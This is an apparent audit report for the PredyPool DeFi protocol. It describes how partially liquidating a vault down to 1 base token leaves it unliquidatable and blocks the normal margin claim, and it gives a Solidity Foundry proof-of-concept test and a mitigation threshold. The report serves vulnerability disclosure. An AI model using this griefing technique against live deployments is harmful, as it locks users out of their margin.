# Vulnerability details

## Description
`PredyPool` allows partial liquidate a position by specifying the `closeRatio`. When a vault is liquidatable, an attacker can partial liquidate a vault to only `1 baseToken` left, because of that `PositionCalculator::calculateMinMargin` will return `hasPosition = true` and the user can not claim the margin back.

After that, no one can liquidate this vault because the market contract can not perform the swap with `UniswapRouter` with only `1 baseToken`. Even if there is a contract implemented `predySettlementCallback` that take `1 baseToken` away and give back `quoteToken` still can not liquidate this vault because `SlippageLib::checkPrice` would revert because the slippage is too large.

The user can not close the position with `1 baseToken` (because the market contract can not perform the swap with `UniswapRouter` with only `1 baseToken`) to claim back the margin. There is no loss of fund because the user can open a new position and close that position to claim back the margin. But from the user's perspective, they can not close the position nor claim back the margin. The user need to know that two-step trick to claim back the margin, and it would not be the normal way to claim back the margin.

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {TestPerpMarket} from "./market/perp/Setup.t.sol";
import {OrderInfo} from "../src/libraries/orders/OrderInfoLib.sol";
import {PerpOrderV3} from "../src/markets/perp/PerpOrderV3.sol";
import {PerpMarketLib} from "../src/markets/perp/PerpMarketLib.sol";
import {MockPriceFeed} from "./mocks/MockPriceFeed.sol";
import {Constants} from "../src/libraries/Constants.sol";
import {IFillerMarket} from "../src/interfaces/IFillerMarket.sol";

contract POC is TestPerpMarket {
    uint256 user1PrivateKey;
    address user1;

    MockPriceFeed private _priceFeed;

    uint256 MIN_QUOTE_PRICE = Constants.Q96 * 11 / 10;

    function setUp() public override {
        TestPerpMarket.setUp();

        _priceFeed = new MockPriceFeed();

        _priceFeed.setSqrtPrice(Constants.Q96);

        registerPair(address(currency1), address(_priceFeed));
        perpMarket.updateQuoteTokenMap(1);

        user1PrivateKey = 0x12341234;
        user1 = vm.addr(user1PrivateKey);

        currency1.mint(user1, 2 ** 250);

        vm.prank(user1);
        currency1.approve(address(permit2), type(uint256).max);

        predyPool.supply(1, true, 1e10);
        predyPool.supply(1, false, 1e10);
    }

    function test() public {
        {
            PerpOrderV3 memory order = PerpOrderV3(
                OrderInfo(address(perpMarket), user1, 0, block.timestamp + 100),
                1,
                address(currency1),
                "Sell",
                1e6,
                1e6 * 101 / 100,
                0,
                0,
                1,
                false,
                false,
                abi.encode(PerpMarketLib.AuctionParams(0, 0, 0, 0))
            );

            IFillerMarket.SignedOrder memory signedOrder = _createSignedOrder(order, user1PrivateKey);

            perpMarket.executeOrderV3(signedOrder, _getUniSettlementDataV3(0));
        }

        _priceFeed.setSqrtPrice(2 * Constants.Q96);

        perpMarket.execLiquidationCall(1, 1e18 - 1e12, _getUniSettlementDataV3(Constants.Q96 * 12 / 10));

        vm.expectRevert();
        perpMarket.execLiquidationCall(1, 1e18, _getUniSettlementDataV3(Constants.Q96 * 12 / 10));

        {
            PerpOrderV3 memory order = PerpOrderV3(
                OrderInfo(address(perpMarket), user1, 1, block.timestamp + 100),
                1,
                address(currency1),
                "Buy",
                1,
                0,
                0,
                0,
                1,
                false,
                false,
                abi.encode(PerpMarketLib.AuctionParams(2 * Constants.Q96, 2 * Constants.Q96, 0, 0))
            );

            IFillerMarket.SignedOrder memory signedOrder = _createSignedOrder(order, user1PrivateKey);

            vm.expectRevert();
            perpMarket.executeOrderV3(signedOrder, _getUniSettlementDataV3(MIN_QUOTE_PRICE));
        }
    }
}
```

## Impact
The user can not claim back the margin from the liquidated vault in a normal way.

## Tools Used
Manual Review

## Recommended Mitigation Steps
If the `vault.openPosition.perp.amount - vault.openPosition.perp.amount * int256(closeRatio) / 1e18` is less than a threshold, the liquidator will need to liquidate the whole position.
